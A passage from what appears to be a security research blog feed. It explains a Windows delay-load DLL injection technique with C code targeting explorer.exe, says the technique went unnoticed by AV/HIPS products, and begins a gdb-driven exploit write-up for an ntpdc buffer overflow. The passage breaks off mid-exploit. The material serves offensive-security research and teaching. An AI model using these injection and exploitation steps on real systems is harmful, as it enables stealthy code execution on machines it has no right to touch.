<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0:022&gt; dps 00690000+000b1000 l2
</span><span class='line'>00741000  006dd0ac explorer!_imp_load__PlaySoundW
</span><span class='line'>00741004  00000000</span></code></pre></td></tr></table></div></figure>


<p>Each DLL entry is null terminated.  The above pointer shows us that the existing
entry is merely a springboard thunk within the Explorer process.  This takes
us here:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0:022&gt; u explorer!_imp_load__PlaySoundW
</span><span class='line'>explorer!_imp_load__PlaySoundW:
</span><span class='line'>006dd0ac b800107400      mov     eax,offset explorer!_imp__PlaySoundW (00741000)
</span><span class='line'>006dd0b1 eb00            jmp     explorer!_tailMerge_WINMM_dll (006dd0b3)
</span><span class='line'>explorer!_tailMerge_WINMM_dll:
</span><span class='line'>006dd0b3 51              push    ecx
</span><span class='line'>006dd0b4 52              push    edx
</span><span class='line'>006dd0b5 50              push    eax
</span><span class='line'>006dd0b6 6870c67300      push    offset explorer!_DELAY_IMPORT_DESCRIPTOR_WINMM_dll (0073c670)
</span><span class='line'>006dd0bb e8296cfdff      call    explorer!__delayLoadHelper2 (006b3ce9)</span></code></pre></td></tr></table></div></figure>


<p>The tailMerge function is a linker-generated stub that&rsquo;s compiled in per-DLL,
not per function.  The <code>__delayLoadHelper2</code> function is the magic that
handles the loading and patching of the pseudo IAT.  Documented in delayhlp.cpp,
this function handles calling LoadLibrary/GetProcAddress and patching the
pseudo IAT.  As a demonstration of how this looks, I compiled a binary that
delay links dnslib.  Here&rsquo;s the process of resolution of
DnsAcquireContextHandle:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0:000&gt; dps 00060000+0001839c l2
</span><span class='line'>0007839c  000618bd DelayTest!_imp_load_DnsAcquireContextHandle_W
</span><span class='line'>000783a0  00000000
</span><span class='line'>0:000&gt; bp DelayTest!__delayLoadHelper2
</span><span class='line'>0:000&gt; g
</span><span class='line'>ModLoad: 753e0000 7542c000   C:\Windows\system32\apphelp.dll
</span><span class='line'>Breakpoint 0 hit
</span><span class='line'>[...]
</span><span class='line'>0:000&gt; dd esp+4 l1
</span><span class='line'>0024f9f4  00075ffc
</span><span class='line'>0:000&gt; dd 00075ffc l4
</span><span class='line'>00075ffc  00000001 00010fb0 000183c8 0001839c
</span><span class='line'>0:000&gt; da 00060000+00010fb0 
</span><span class='line'>00070fb0  "DNSAPI.dll"
</span><span class='line'>0:000&gt; pt
</span><span class='line'>0:000&gt; dps 00060000+0001839c l2
</span><span class='line'>0007839c  74dfd0fc DNSAPI!DnsAcquireContextHandle_W
</span><span class='line'>000783a0  00000000</span></code></pre></td></tr></table></div></figure>


<p>Now the pseudo IAT entry has been patched up and the correct function is
invoked on subsequent calls.  This has the additional side effect of leaving
the pseudo IAT as both executable and writable:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0:011&gt; !vprot 00060000+0001839c
</span><span class='line'>BaseAddress:       00371000
</span><span class='line'>AllocationBase:    00060000
</span><span class='line'>AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY</span></code></pre></td></tr></table></div></figure>


<p>At this point, the DLL has been loaded into the process and the pseudo IAT
patched up.  In another additional twist, not all functions are resolved on
load, only the one that is invoked.  This leaves certain entries in the
pseudo IAT in a mixed state:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>00741044  00726afa explorer!_imp_load__UnInitProcessPriv
</span><span class='line'>00741048  7467f845 DUI70!InitThread
</span><span class='line'>0074104c  00726b0f explorer!_imp_load__UnInitThread
</span><span class='line'>00741050  74670728 DUI70!InitProcessPriv
</span><span class='line'>0:022&gt; lm m DUI70
</span><span class='line'>start    end        module name
</span><span class='line'>74630000 746e2000   DUI70      (pdb symbols)</span></code></pre></td></tr></table></div></figure>


<p>In the above, two of the four functions are resolved and the DUI70.dll library
is loaded into the process.  In each entry of the delay load descriptor, the
structure referenced above maintains an RVA to the HMODULE.  If the module
isn&rsquo;t loaded, it will be null.  So when a delayed function is invoked that&rsquo;s
already loaded, the delay helper function will check it&rsquo;s entry to determine if
a handle to it can be used:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>HMODULE hmod = *idd.phmod;
</span><span class='line'>    if (hmod == 0) {
</span><span class='line'>        if (__pfnDliNotifyHook2) {
</span><span class='line'>            hmod = HMODULE(((*__pfnDliNotifyHook2)(dliNotePreLoadLibrary, &dli)));
</span><span class='line'>            }
</span><span class='line'>        if (hmod == 0) {
</span><span class='line'>            hmod = ::LoadLibraryEx(dli.szDll, NULL, 0);
</span><span class='line'>            }</span></code></pre></td></tr></table></div></figure>


<p>The <code>idd</code> structure is just an instance of the InternalImgDelayDescr described
above and passed into the <code>__delayLoadHelper2</code> function from the linker
tailMerge stub.  So if the module is already loaded, as referenced from delay
entry, then it uses that handle instead.  It does NOT attempt to LoadLibrary
irregardless of this value; this can be used to our advantage.</p>

<p>Another note here is that the delay loader supports notification hooks.  There
are six states we can hook into: processing start, pre load library, fail
load library, pre GetProcAddress, fail GetProcAddress, and end processing.  You
can see how the hooks are used in the above code sample.</p>

<p>Finally, in addition to delay loading, the portable executable also supports
delay library unloading.  It works pretty much how you&rsquo;d expect it, so we
won&rsquo;t be touching on it here.</p>

<h2>Limitations</h2>

<p>Before detailing how we might abuse this (though it should be fairly obvious),
it&rsquo;s important to note the limitations of this technique.  It is not completely
portable, and using pure delay load functionality it cannot be made to be so.</p>

<p>The glaring limitation is that the technique requires the remote process to be
delay linked.  A brief crawl of some local processes on my host shows many
Microsoft applications are: dwm, explorer, cmd.  Many non-Microsoft
applications are as well, including Chrome.  It is additionally a well
supported function of the portable executable, and exists today on modern
systems.</p>

<p>Another limitation is that, because at it&rsquo;s core it relies on LoadLibrary,
there must exist a DLL on disk.  There is no way to LoadLibrary from memory
(unless you use one of the countless techniques to do that, but none of which
use LoadLibrary&hellip;).</p>

<p>In addition to implementing the delay load, the remote process must implement
functionality that can be triggered.  Instead of doing a CreateRemoteThread,
SendNotifyMessage, or ResumeThread, we rely on the fetch to the pseudo IAT, and
thus we must be able to trigger the remote process into performing this
action/executing this function.  This is generally pretty easy if you&rsquo;re using
the suspended process/new process strategy, but may not be trivial on running
applications.</p>

<p>Finally, any process that does not allow unsigned libraries to be loaded will
block this technique.  This is controlled by ProcessSignaturePolicy and can be
set with SetProcessMitigationPolicy[2]; it is unclear how many apps are using
this at the moment, but Microsoft Edge was one of the first big products to be
employing this policy.  This technique is also impacted by the
ProcessImageLoadPolicy policy, which can be set to restrict loading of images
from a UNC share.</p>

<h2>Abuse</h2>

<p>When discussing an ability to inject code into a process, there are three
separate cases an attacker may consider, and some additional edge situations
within remote processes.  Local process injection is simply the execution of
shellcode/arbitrary code within the current process.  Suspended process is the
act of spawning a new, suspended process from an existing, controlled one and
injecting code into it.  This is a fairly common strategy to employ for
migrating code, setting up backup connections, or establishing a known process
state prior to injection.  The final case is the running remote process.</p>

<p>The running remote process is an interesting case with several caveats that
we&rsquo;ll explore below.  I won&rsquo;t detail suspended processes, as it&rsquo;s essentially
the same as a running process, but easier.  It&rsquo;s easier because many
applications actually just load the delay library at runtime, either because
the functionality is environmentally keyed and required then, or because
another loaded DLL is linked against it and requires it.  Refer to the source
code for the project for an implementation of suspended process injection [3].</p>

<h3>Local Process</h3>

<p>The local process is the most simple and arguably the most useless for this
strategy.  If we can inject and execute code in this manner, we might as well
link against the library we want to use.  It serves as a fine introduction to
the topic, though.</p>

<p>The first thing we need to do is delay link the executable against something.
For various reasons I originally chose <code>dnsapi.dll</code>.  You can specify delay
load DLLs via the linker options for Visual Studio.</p>

<p>With that, we need to obtain the RVA for the delay directory.  This can be
accomplished with the following function:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>IMAGE_DELAYLOAD_DESCRIPTOR*
</span><span class='line'>findDelayEntry(char *cDllName)
</span><span class='line'>{
</span><span class='line'>    PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
</span><span class='line'>    PIMAGE_NT_HEADERS pImgNt = (PIMAGE_NT_HEADERS)((LPBYTE)pImgDos + pImgDos-&gt;e_lfanew);
</span><span class='line'>    PIMAGE_DELAYLOAD_DESCRIPTOR pImgDelay = (PIMAGE_DELAYLOAD_DESCRIPTOR)((LPBYTE)pImgDos + 
</span><span class='line'>            pImgNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].VirtualAddress);
</span><span class='line'>    DWORD dwBaseAddr = (DWORD)GetModuleHandle(NULL);
</span><span class='line'>    IMAGE_DELAYLOAD_DESCRIPTOR *pImgResult = NULL;
</span><span class='line'>
</span><span class='line'>    // iterate over entries 
</span><span class='line'>    for (IMAGE_DELAYLOAD_DESCRIPTOR* entry = pImgDelay; entry-&gt;ImportAddressTableRVA != NULL; entry++){
</span><span class='line'>        char *_cDllName = (char*)(dwBaseAddr + entry-&gt;DllNameRVA);
</span><span class='line'>        if (strcmp(_cDllName, cDllName) == 0){
</span><span class='line'>            pImgResult = entry;
</span><span class='line'>            break;
</span><span class='line'>        }
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    return pImgResult;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Should be pretty clear what we&rsquo;re doing here.  Once we&rsquo;ve got the correct table
entry, we need to mark the entry&rsquo;s DllName as writable, overwrite it with our
custom DLL name, and restore the protection mask:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>IMAGE_DELAYLOAD_DESCRIPTOR *pImgDelayEntry = findDelayEntry("DNSAPI.dll");
</span><span class='line'>DWORD dwEntryAddr = (DWORD)((DWORD)GetModuleHandle(NULL) + pImgDelayEntry-&gt;DllNameRVA);
</span><span class='line'>VirtualProtect((LPVOID)dwEntryAddr, sizeof(DWORD), PAGE_READWRITE, &dwOldProtect);
</span><span class='line'>WriteProcessMemory(GetCurrentProcess(), (LPVOID)dwEntryAddr, (LPVOID)ndll, strlen(ndll), &wroteBytes);
</span><span class='line'>VirtualProtect((LPVOID)dwEntryAddr, sizeof(DWORD), dwOldProtect, &dwOldProtect);</span></code></pre></td></tr></table></div></figure>


<p>Now all that&rsquo;s left to do is trigger the targeted function.  Once triggered,
the delay helper function will snag the DllName from the table entry and load
the DLL via LoadLibrary.</p>

<h3>Remote Process</h3>

<p>The most interesting of cases is the running remote process.  For demonstration
here, we&rsquo;ll be targeting explorer.exe, as we can almost always rely on it to be
running on a workstation under the current user.</p>

<p>With an open handle to the explorer process, we must perform the same
searching tasks as we did for the local process, but this time in a remote
process.  This is a little more cumbersome, but the code can be found in the
project repository for reference[3].  We simply grab the remote PEB, parse the
image and it&rsquo;s directories, and locate the appropriate delay entry we&rsquo;re
targeting.</p>

<p>This part is likely to prove the most unfriendly when attempting to port this
to another process; what functionality are we targeting?  What function or
delay load entry is generally unused, but triggerable from the current session?
With explorer there are several options; it&rsquo;s delay linked against 9 different
DLLs, each averaging 2-3 imported functions.  Thankfully one of the first
functions I looked at was pretty straightforward: <code>CM_Request_Eject_PC</code>.  This
function, exported by <code>CFGMGR32.dll</code>, requests that the system be ejected from
the local docking station[4].  We can therefore assume that it&rsquo;s likely to be
available and not fixed on workstations, and potentially unfixed on laptops,
should the user never explicitly request the system to be ejected.</p>

<p>When we request for the workstation to be ejected from the docking station, the
function sends a PNP request.  We use the IShellDispatch object to execute
this, which is accessed via Shell, handled by, you guessed it, explorer.</p>

<p>The code for this is pretty simple:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>HRESULT hResult = S_FALSE;
</span><span class='line'>IShellDispatch *pIShellDispatch = NULL;
</span><span class='line'>
</span><span class='line'>CoInitialize(NULL);
</span><span class='line'>
</span><span class='line'>hResult = CoCreateInstance(CLSID_Shell, NULL, CLSCTX_INPROC_SERVER, 
</span><span class='line'>                           IID_IShellDispatch, (void**)&pIShellDispatch);
</span><span class='line'>if (SUCCEEDED(hResult))
</span><span class='line'>{
</span><span class='line'>    pIShellDispatch-&gt;EjectPC();
</span><span class='line'>    pIShellDispatch-&gt;Release();
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>CoUninitialize();</span></code></pre></td></tr></table></div></figure>


<p>Our DLL only needs to export <code>CM_Request_Eject_PC</code> for us to not crash the
process; we can either pass on the request to the real DLL, or simply ignore
it.  This leads us to stable and reliable remote code injection.</p>

<h3>Remote Process &ndash; All Fixed</h3>

<p>One interesting edge case is a remote process that you want to inject into via
delay loading, but all imported functions have been resolved in the pseudo IAT.
This is a little more complicated, but all hope is not lost.</p>

<p>Remember when I mentioned earlier that a handle to the delay load library is
maintained in its descriptor?  This is the value that the helper function
checks for to determine if it should reload the module or not; if it&rsquo;s null, it
attempts to load it, if it&rsquo;s not, it uses that handle.  We can abuse this check
by nulling out the module handle, thereby &ldquo;tricking&rdquo; the helper function into
once again loading that descriptor&rsquo;s DLL.</p>

<p>In the discussed case, however, the pseudo IAT is all patched up; no more
trampolines into the delay load helper function.  Helpfully the pseudo IAT is
writable by default, so we can simply patch in the trampoline function
ourselves and have it instantiate the descriptor all over again.  In short,
this worst-case strategy requires three separate WriteProcessMemory calls: one
to null out the module handle, one to overwrite the pseudo IAT entry, and one
to overwrite the loaded DLL name.</p>

<h3>Conclusions</h3>

<p>I should make mention that I tested this strategy across several next gen
AV/HIPS appliances, which will go unnamed here, and none where able to detect
the cross process injection strategy.  It would seem overall to be an
interesting challenge at detection; in remote processes, the strategy uses the
following chain of calls:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>OpenProcess(..);
</span><span class='line'>
</span><span class='line'>ReadRemoteProcess(..); // read image
</span><span class='line'>ReadRemoteProcess(..); // read delay table 
</span><span class='line'>ReadRemoteProcess(..); // read delay entry 1...n
</span><span class='line'>
</span><span class='line'>VirtualProtectEx(..);
</span><span class='line'>WriteRemoteProcess(..);</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s it.  The trigger functionality would be dynamic among each process, and
the loaded library would be loaded via supported and well-known Windows
facilities.  I checked out a few other core Windows applications, and they all
have pretty straightforward trigger strategies.</p>

<p>The referenced project[3] includes both x86 and x64 support, and has been
tested across Windows 7, 8.1, and 10.  It includes three functions of interest:
inject_local, inject_suspended, and inject_explorer.  It expects to find
the DLL at <code>C:\Windows\Temp\TestDLL.dll</code>, but this can obviously be changed.
Note that it isn&rsquo;t production quality; beware, here be dragons.</p>

<p><em>Special thanks to Stephen Breen for reviewing this post</em></p>

<h2>References</h2>

<p>[0]
<a href="https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process">https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process</a> <br/>
[1] <a href="https://www.microsoft.com/msj/1298/hood/hood1298.aspx">https://www.microsoft.com/msj/1298/hood/hood1298.aspx</a> <br/>
[2]
<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/hh769088">https://msdn.microsoft.com/en-us/library/windows/desktop/hh769088</a>(v=vs.85).aspx <br/>
[3] <a href="https://github.com/hatRiot/DelayLoadInject">https://github.com/hatRiot/DelayLoadInject</a>  <br/>
[4]
<a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff539811">https://msdn.microsoft.com/en-us/library/windows/hardware/ff539811</a>(v=vs.85).aspx</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Abusing Token Privileges for EoP]]></title>
    <link href="http://hatRiot.github.io/blog/2017/09/01/abusing-token-privileges-for-eop/"/>
    <updated>2017-09-01T14:00:00-07:00</updated>
    <id>http://hatRiot.github.io/blog/2017/09/01/abusing-token-privileges-for-eop</id>
    <content type="html"><![CDATA[<p>This is just a placeholder post to link off to Stephen Breen and I&rsquo;s paper on
abusing token privileges. You can read the entire paper here[0]. I also
recommend checking out the blogpost he posted on Foxglove here[1].</p>

<h2></h2>

<p>[0] <a href="https://raw.githubusercontent.com/hatRiot/token-priv/master/abusing_token_eop_1.0.txt">https://raw.githubusercontent.com/hatRiot/token-priv/master/abusing_token_eop_1.0.txt</a> <br/>
[1] <a href="https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/">https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ntpdc local buffer overflow]]></title>
    <link href="http://hatRiot.github.io/blog/2015/01/06/ntpdc-exploit/"/>
    <updated>2015-01-06T13:10:04-08:00</updated>
    <id>http://hatRiot.github.io/blog/2015/01/06/ntpdc-exploit</id>
    <content type="html"><![CDATA[<p>Alejandro Hdez (@nitr0usmx) recently <a href="https://twitter.com/nitr0usmx/status/550372148448333825">tweeted</a> about a trivial buffer overflow in ntpdc, a deprecated NTP query tool still available and packaged with any NTP install.  He posted a screenshot of the crash as the result of a large buffer passed into a vulnerable <code>gets</code> call.  After digging into it a bit, I decided it&rsquo;d be a fun exploit to write, and it was.  There are a few quarks to it that make it of particular interest, of which I&rsquo;ve detailed below.</p>

<p>As noted, the bug is the result of a vulnerable <code>gets</code>, which can be crashed with the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "A"*600' | ntpdc
</span><span class='line'>***Command `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' unknown
</span><span class='line'>Segmentation fault</span></code></pre></td></tr></table></div></figure>


<p>Loading into gdb on an x86 Debian 7 system:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ i r eax edx esi
</span><span class='line'>eax            0x41414141   0x41414141
</span><span class='line'>edx            0x41414141   0x41414141
</span><span class='line'>esi            0x41414141   0x41414141
</span><span class='line'>gdb-peda$ x/i $eip
</span><span class='line'>=&gt; 0xb7fa1d76 &lt;el_gets+22&gt;: mov    eax,DWORD PTR [esi+0x14]
</span><span class='line'>gdb-peda$ checksec
</span><span class='line'>CANARY    : ENABLED
</span><span class='line'>FORTIFY   : ENABLED
</span><span class='line'>NX        : ENABLED
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : Partial</span></code></pre></td></tr></table></div></figure>


<p>Notice the <code>checksec</code> results of the binary, now compare this to a snippet of the <code>paxtest</code> output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Mode: Blackhat
</span><span class='line'>Linux deb7-32 3.2.0-4-486 #1 Debian 3.2.63-2+deb7u2 i686 GNU/Linux
</span><span class='line'>
</span><span class='line'>Executable anonymous mapping             : Vulnerable
</span><span class='line'>Executable bss                           : Vulnerable
</span><span class='line'>Executable data                          : Vulnerable
</span><span class='line'>Executable heap                          : Vulnerable
</span><span class='line'>Executable stack                         : Vulnerable
</span><span class='line'>Executable shared library bss            : Vulnerable
</span><span class='line'>Executable shared library data           : Vulnerable</span></code></pre></td></tr></table></div></figure>


<p>And the result of Debian&rsquo;s recommended <code>hardening-check</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ hardening-check /usr/bin/ntpdc 
</span><span class='line'>/usr/bin/ntpdc:
</span><span class='line'> Position Independent Executable: no, normal executable!
</span><span class='line'> Stack protected: yes
</span><span class='line'> Fortify Source functions: yes (some protected functions found)
</span><span class='line'> Read-only relocations: yes
</span><span class='line'> Immediate binding: no, not found!</span></code></pre></td></tr></table></div></figure>


<p>Interestingly enough, I discovered this oddity after I had gained code execution in a place I shouldn&rsquo;t have.  We&rsquo;re also running with ASLR enabled:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /proc/sys/kernel/randomize_va_space 
</span><span class='line'>2</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ll explain why the above is interesting in a moment.</p>

<p>So in our current state, we control three registers and an instruction dereferencing <code>ESI+0x14</code>.  If we take a look just a few instructions ahead, we see the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ x/8i $eip
</span><span class='line'>=&gt; 0xb7fa1d76 &lt;el_gets+22&gt;: mov    eax,DWORD PTR [esi+0x14] ; deref ESI+0x14 and move into EAX
</span><span class='line'>   0xb7fa1d79 &lt;el_gets+25&gt;: test   al,0x2                   ; test lower byte against 0x2
</span><span class='line'>   0xb7fa1d7b &lt;el_gets+27&gt;: je     0xb7fa1df8 &lt;el_gets+152&gt; ; jump if ZF == 1
</span><span class='line'>   0xb7fa1d7d &lt;el_gets+29&gt;: mov    ebp,DWORD PTR [esi+0x2c] ; doesnt matter 
</span><span class='line'>   0xb7fa1d80 &lt;el_gets+32&gt;: mov    DWORD PTR [esp+0x4],ebp  ; doesnt matter
</span><span class='line'>   0xb7fa1d84 &lt;el_gets+36&gt;: mov    DWORD PTR [esp],esi      ; doesnt matter
</span><span class='line'>   0xb7fa1d87 &lt;el_gets+39&gt;: call   DWORD PTR [esi+0x318]    ; call a controllable pointer </span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ve detailed the instructions above, but essentially we&rsquo;ve got a free CALL.  In order to reach this, we need an ESI value that at +0x14 will set ZF == 0 (to bypass the test/je) and at +0x318 will point into controlled data.</p>

<p>Naturally, we should figure out where our payload junk is and go from there.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ searchmem 0x41414141
</span><span class='line'>Searching for '0x41414141' in: None ranges
</span><span class='line'>Found 751 results, display max 256 items:
</span><span class='line'> ntpdc : 0x806ab00 ('A' &lt;repeats 200 times&gt;...)
</span><span class='line'>gdb-peda$ maintenance i sections
</span><span class='line'>[snip]
</span><span class='line'>0x806a400-&gt;0x806edc8 at 0x00021400: .bss ALLOC
</span><span class='line'>gdb-peda$ vmmap
</span><span class='line'>Start      End        Perm  Name
</span><span class='line'>0x08048000 0x08068000 r-xp  /usr/bin/ntpdc
</span><span class='line'>0x08068000 0x08069000 r--p  /usr/bin/ntpdc
</span><span class='line'>0x08069000 0x0806b000 rw-p  /usr/bin/ntpdc
</span><span class='line'>[snip]</span></code></pre></td></tr></table></div></figure>


<p>Our payload is copied into BSS, which is beneficial as this will remain unaffected by ASLR, further bonus points because our binary wasn&rsquo;t compiled with PIE.  We now need to move back -0x318 and look for a value that will set ZF == 0 with the <code>test al,0x2</code> instruction.  A value at <code>0x806a9e1</code> satisfies both the +0x14 and +0x318 requirements:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ x/wx 0x806a9cd+0x14
</span><span class='line'>0x806a9e1:  0x6c61636f
</span><span class='line'>gdb-peda$ x/wx 0x806a9cd+0x318
</span><span class='line'>0x806ace5:  0x41414141</span></code></pre></td></tr></table></div></figure>


<p>After figuring out the offset in the payload for ESI, we just need to plug <code>0x806a9cd</code> in and hopefully we&rsquo;ll have EIP:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
